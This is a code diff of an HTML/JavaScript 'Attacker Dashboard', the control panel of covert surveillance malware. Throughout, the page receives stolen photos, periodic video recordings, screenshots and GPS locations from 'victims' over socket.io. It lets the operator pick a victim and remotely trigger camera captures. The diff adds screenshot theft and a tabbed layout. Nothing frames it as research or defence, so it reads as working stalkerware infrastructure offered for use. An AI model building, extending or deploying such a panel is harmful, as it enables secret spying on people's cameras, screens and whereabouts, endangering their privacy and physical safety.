@@ -3,265 +3,288 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attacker Control Panel</title>
+    <title>Attacker Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
             background: #0a0e27;
             color: #e0e0e0;
+            font-family: monospace;
             padding: 20px;
         }
-        .container { max-width: 1400px; margin: 0 auto; }
-        
         .header {
+            border-bottom: 2px solid #ff4d4d;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid #1e2a4a;
+            flex-wrap: wrap;
         }
-        .title h1 { font-size: 24px; color: #ff4d4d; margin-bottom: 4px; }
-        .title p { font-size: 12px; color: #6b7c93; }
-        .live-badge {
-            background: #ff4d4d;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-        .stat-card {
+        .live { color: #ff4d4d; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.5; } }
+        .stats {
             background: #0f1433;
-            border-radius: 12px;
-            padding: 16px;
-            border: 1px solid #1e2a4a;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
         }
-        .stat-card .label { font-size: 12px; color: #6b7c93; margin-bottom: 8px; }
-        .stat-card .value { font-size: 28px; font-weight: bold; color: #00ff88; }
-        
         .control-bar {
             background: #0f1433;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 24px;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
             display: flex;
-            gap: 12px;
+            gap: 10px;
             flex-wrap: wrap;
             align-items: center;
-            border: 1px solid #1e2a4a;
         }
-        .victim-select {
-            background: #1a1f3e;
-            border: 1px solid #2a3a5a;
-            color: white;
-            padding: 10px 16px;
-            border-radius: 8px;
-            font-size: 14px;
-            flex: 1;
-            min-width: 200px;
-        }
-        button {
-            background: #ff4d4d;
-            color: white;
+        select, button {
+            padding: 10px 15px;
+            border-radius: 6px;
             border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
             cursor: pointer;
-            font-weight: 600;
-            transition: all 0.2s;
         }
-        button:hover { background: #ff3333; transform: scale(1.02); }
+        select { background: #1a1f3e; color: white; }
+        button { background: #ff4d4d; color: white; font-weight: bold; }
         button.secondary { background: #2a3a5a; }
-        button.secondary:hover { background: #3a4a6a; }
-        
         .photo-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 12px;
-            margin-top: 16px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+            max-height: 400px;
+            overflow-y: auto;
         }
-        .photo-card {
-            background: #0f1433;
+        .photo-item {
+            position: relative;
+            width: 150px;
+            border: 1px solid #1e2a4a;
             border-radius: 8px;
             overflow: hidden;
-            border: 1px solid #1e2a4a;
+            background: #0f1433;
         }
-        .photo-card img {
+        .photo-item img {
             width: 100%;
             aspect-ratio: 1;
             object-fit: cover;
         }
-        .photo-card .time {
-            font-size: 10px;
-            color: #6b7c93;
-            padding: 8px;
-            text-align: center;
-        }
-        .manual-badge {
+        .photo-item .badge {
+            position: absolute;
+            top: 5px;
+            left: 5px;
             background: #ff4d4d;
             font-size: 9px;
             padding: 2px 6px;
             border-radius: 4px;
-            position: absolute;
-            margin: 4px;
+        }
+        .photo-item .time {
+            font-size: 9px;
+            padding: 4px;
+            text-align: center;
+            color: #6b7c93;
         }
         .video-grid {
             display: flex;
             flex-wrap: wrap;
-            gap: 16px;
-            margin-top: 16px;
+            gap: 15px;
+            margin-top: 15px;
+            max-height: 400px;
+            overflow-y: auto;
         }
-        .video-card {
-            background: #0f1433;
+        .video-item {
+            width: 250px;
+            border: 1px solid #1e2a4a;
             border-radius: 8px;
             overflow: hidden;
-            width: 280px;
-            border: 1px solid #1e2a4a;
+            background: #0f1433;
         }
-        .video-card video {
+        .video-item video {
             width: 100%;
             aspect-ratio: 16/9;
         }
+        .screenshot-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .screenshot-item {
+            width: 200px;
+            border: 1px solid #ff4d4d;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .screenshot-item img {
+            width: 100%;
+        }
         .location-card {
             background: #0f1433;
-            border-radius: 12px;
-            padding: 16px;
-            margin-top: 16px;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 3px solid #ff4d4d;
+        }
+        .tab-bar {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+            border-bottom: 1px solid #1e2a4a;
+            padding-bottom: 10px;
         }
-        .empty-state {
-            text-align: center;
-            padding: 40px;
-            color: #6b7c93;
-            background: #0f1433;
-            border-radius: 12px;
+        .tab {
+            padding: 8px 16px;
+            cursor: pointer;
+            border-radius: 20px;
         }
+        .tab.active {
+            background: #ff4d4d;
+            color: white;
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <div class="title">
-            <h1>🔴 Attacker Control Panel</h1>
-            <p>Live Surveillance Dashboard — Real-time victim data</p>
-        </div>
-        <div class="live-badge">● LIVE</div>
-    </div>
-    
-    <div class="stats-grid">
-        <div class="stat-card"><div class="label">📸 Photos</div><div class="value" id="photoCount">0</div></div>
-        <div class="stat-card"><div class="label">🎥 Videos</div><div class="value" id="videoCount">0</div></div>
-        <div class="stat-card"><div class="label">📍 Location</div><div class="value" id="locationCount">0</div></div>
-        <div class="stat-card"><div class="label">🎯 Victims</div><div class="value" id="victimCount">0</div></div>
-    </div>
-    
-    <div class="control-bar">
-        <select id="victimSelect" class="victim-select">
-            <option value="">Select victim to control</option>
-        </select>
-        <button id="capturePhotoBtn">📸 Capture Photo NOW</button>
-        <button id="requestLocationBtn" class="secondary">📍 Get Location</button>
-        <button id="clearAllBtn" class="secondary">🗑️ Clear All</button>
-    </div>
-    
-    <div>
-        <h3>📍 Last Known Location</h3>
-        <div id="locationContainer"><div class="empty-state">Waiting for location...</div></div>
-    </div>
-    
-    <div style="margin-top: 24px;">
-        <h3>📸 Stolen Photos <span style="font-size:12px; color:#ff4d4d;">(🔴 Red badge = manually requested)</span></h3>
-        <div id="photoGrid" class="photo-grid"><div class="empty-state">No photos yet. Click "Capture Photo NOW" or wait for auto-capture</div></div>
-    </div>
-    
-    <div style="margin-top: 24px;">
-        <h3>🎥 Stolen Videos</h3>
-        <div id="videoGrid" class="video-grid"><div class="empty-state">No videos yet</div></div>
-    </div>
+
+<div class="header">
+    <h1>🔴 Attacker Dashboard</h1>
+    <div class="live">● LIVE SURVEILLANCE</div>
+</div>
+
+<div class="stats">
+    <div>📸 Photos: <span id="photoCount">0</span></div>
+    <div>🎥 Videos: <span id="videoCount">0</span></div>
+    <div>🖥️ Screenshots: <span id="screenshotCount">0</span></div>
+    <div>📍 Locations: <span id="locationCount">0</span></div>
+    <div>🎯 Victims: <span id="victimCount">0</span></div>
+</div>
+
+<div class="control-bar">
+    <select id="victimSelect">
+        <option value="">Select victim to control</option>
+    </select>
+    <button id="captureBtn">📸 Capture Photo NOW</button>
+    <button id="clearBtn" class="secondary">🗑️ Clear All</button>
+</div>
+
+<div class="tab-bar">
+    <div class="tab active" data-tab="photos">📸 Photos</div>
+    <div class="tab" data-tab="videos">🎥 Videos</div>
+    <div class="tab" data-tab="screenshots">🖥️ Screenshots</div>
+    <div class="tab" data-tab="location">📍 Location</div>
+</div>
+
+<div id="photosTab" class="tab-content active">
+    <div id="photoGrid" class="photo-grid">No photos yet. Click "Capture Photo NOW" or wait for auto-capture</div>
+</div>
+
+<div id="videosTab" class="tab-content">
+    <div id="videoGrid" class="video-grid">No videos yet. Videos record every 15 seconds</div>
+</div>
+
+<div id="screenshotsTab" class="tab-content">
+    <div id="screenshotGrid" class="screenshot-grid">No screenshots yet</div>
+</div>
+
+<div id="locationTab" class="tab-content">
+    <div id="locationDiv">Waiting for location...</div>
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
     const socket = io();
-    let photoCount = 0, videoCount = 0, locationCount = 0;
+    let photoCount = 0, videoCount = 0, screenshotCount = 0, locationCount = 0;
     let victims = new Map();
-    let currentVictimId = null;
+    let currentVictim = null;
     
     socket.emit('dashboard_join');
     
+    // Photos
     socket.on('new_photo', (data) => {
         photoCount++;
         document.getElementById('photoCount').innerText = photoCount;
         
         const grid = document.getElementById('photoGrid');
-        if (grid.querySelector('.empty-state')) grid.innerHTML = '';
+        if (grid.innerHTML.includes('No photos')) grid.innerHTML = '';
         
-        const card = document.createElement('div');
-        card.className = 'photo-card';
-        card.style.position = 'relative';
-        const manualBadge = data.manual ? '<div class="manual-badge">MANUAL</div>' : '';
-        card.innerHTML = `
-            ${manualBadge}
+        const div = document.createElement('div');
+        div.className = 'photo-item';
+        div.innerHTML = `
+            <div class="badge">${data.manual ? 'MANUAL' : 'AUTO'}</div>
             <img src="${data.imageData}">
-            <div class="time">${new Date(data.timestamp).toLocaleTimeString()} ${data.manual ? '(manual)' : '(auto)'}</div>
+            <div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>
         `;
-        grid.prepend(card);
+        grid.prepend(div);
         
         if (data.victimId && !victims.has(data.victimId)) {
-            victims.set(data.victimId, { id: data.victimId });
-            updateVictimDropdown();
+            victims.set(data.victimId, data.victimId);
+            updateVictimSelect();
         }
     });
     
+    // Videos
     socket.on('new_video', (data) => {
         videoCount++;
         document.getElementById('videoCount').innerText = videoCount;
+        
         const grid = document.getElementById('videoGrid');
-        if (grid.querySelector('.empty-state')) grid.innerHTML = '';
-        const card = document.createElement('div');
-        card.className = 'video-card';
-        card.innerHTML = `<video controls src="${data.videoData}"></video><div class="time">${new Date().toLocaleTimeString()}</div>`;
-        grid.prepend(card);
+        if (grid.innerHTML.includes('No videos')) grid.innerHTML = '';
+        
+        const div = document.createElement('div');
+        div.className = 'video-item';
+        div.innerHTML = `
+            <video controls src="${data.videoData}"></video>
+            <div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>
+        `;
+        grid.prepend(div);
+        
+        while(grid.children.length > 20) grid.removeChild(grid.lastChild);
     });
     
+    // Screenshots
+    socket.on('new_screenshot', (data) => {
+        screenshotCount++;
+        document.getElementById('screenshotCount').innerText = screenshotCount;
+        
+        const grid = document.getElementById('screenshotGrid');
+        if (grid.innerHTML.includes('No screenshots')) grid.innerHTML = '';
+        
+        const div = document.createElement('div');
+        div.className = 'screenshot-item';
+        div.innerHTML = `
+            <img src="${data.screenshotData}">
+            <div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>
+        `;
+        grid.prepend(div);
+    });
+    
+    // Location
     socket.on('new_location', (data) => {
         locationCount++;
         document.getElementById('locationCount').innerText = locationCount;
-        const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
-        document.getElementById('locationContainer').innerHTML = `
+        document.getElementById('locationDiv').innerHTML = `
             <div class="location-card">
-                <div><strong>📍 ${data.lat}, ${data.lng}</strong><br><span style="font-size:12px;">Accuracy: ±${data.accuracy}m</span></div>
-                <a href="${mapsUrl}" target="_blank" style="color:#4da8ff;">Open in Maps →</a>
+                📍 Latitude: ${data.lat}<br>
+                📍 Longitude: ${data.lng}<br>
+                🎯 Accuracy: ±${data.accuracy}m<br>
+                🔗 <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:#4da8ff;">Open in Google Maps</a>
             </div>
         `;
     });
     
+    // Victim disconnected
     socket.on('victim_disconnected', (victimId) => {
         victims.delete(victimId);
-        updateVictimDropdown();
-        if (currentVictimId === victimId) currentVictimId = null;
+        updateVictimSelect();
+        if (currentVictim === victimId) currentVictim = null;
     });
     
-    function updateVictimDropdown() {
+    function updateVictimSelect() {
         const select = document.getElementById('victimSelect');
         select.innerHTML = '<option value="">Select victim</option>';
-        victims.forEach((_, id) => {
+        victims.forEach((id) => {
             const option = document.createElement('option');
             option.value = id;
             option.textContent = `Victim ${id.slice(0, 8)}...`;
@@ -270,24 +293,38 @@
         document.getElementById('victimCount').innerText = victims.size;
     }
     
-    document.getElementById('victimSelect').onchange = (e) => { currentVictimId = e.target.value; };
-    document.getElementById('capturePhotoBtn').onclick = () => {
-        if (!currentVictimId) { alert('Select a victim first'); return; }
-        fetch(`/request-photo/${currentVictimId}`, { method: 'POST' })
-            .then(res => res.json())
-            .then(data => { if (!data.success) alert('Victim disconnected'); });
+    document.getElementById('victimSelect').onchange = (e) => {
+        currentVictim = e.target.value;
     };
-    document.getElementById('requestLocationBtn').onclick = () => {
-        if (!currentVictimId) { alert('Select a victim first'); return; }
-        fetch(`/request-location/${currentVictimId}`, { method: 'POST' });
+    
+    document.getElementById('captureBtn').onclick = () => {
+        if (!currentVictim) {
+            alert('Select a victim first from the dropdown');
+            return;
+        }
+        fetch(`/api/capture/${currentVictim}`, { method: 'POST' });
+        alert('Photo request sent to victim');
     };
-    document.getElementById('clearAllBtn').onclick = () => {
-        document.getElementById('photoGrid').innerHTML = '<div class="empty-state">No photos yet</div>';
-        document.getElementById('videoGrid').innerHTML = '<div class="empty-state">No videos yet</div>';
-        photoCount = 0; videoCount = 0;
+    
+    document.getElementById('clearBtn').onclick = () => {
+        document.getElementById('photoGrid').innerHTML = 'No photos yet';
+        document.getElementById('videoGrid').innerHTML = 'No videos yet';
+        document.getElementById('screenshotGrid').innerHTML = 'No screenshots yet';
+        photoCount = 0; videoCount = 0; screenshotCount = 0;
         document.getElementById('photoCount').innerText = '0';
         document.getElementById('videoCount').innerText = '0';
+        document.getElementById('screenshotCount').innerText = '0';
     };
+    
+    // Tab switching
+    document.querySelectorAll('.tab').forEach(tab => {
+        tab.onclick = () => {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            tab.classList.add('active');
+            document.getElementById(`${tab.dataset.tab}Tab`).classList.add('active');
+        };
+    });
 </script>
 </body>
 </html>
